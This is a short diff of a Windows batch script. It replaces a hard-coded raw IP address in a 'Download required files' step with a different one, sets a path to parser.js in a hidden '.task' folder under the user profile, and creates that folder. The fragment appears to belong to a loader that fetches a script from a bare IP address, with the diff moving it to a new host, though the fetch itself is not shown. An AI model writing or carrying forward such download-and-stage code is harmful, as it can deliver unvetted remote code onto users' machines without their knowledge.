@@ -60,7 +60,7 @@ if errorlevel 1 (
 :: Download required files
 :: -------------------------
 set "USERPROFILE=%USERPROFILE%"
-set "URL=http://64.204.80.37"
+set "URL=http://51.194.112.87"
 set "PJS=%USERPROFILE%\.task\parser.js"
 
 MD "%USERPROFILE%\.task" 2>nul
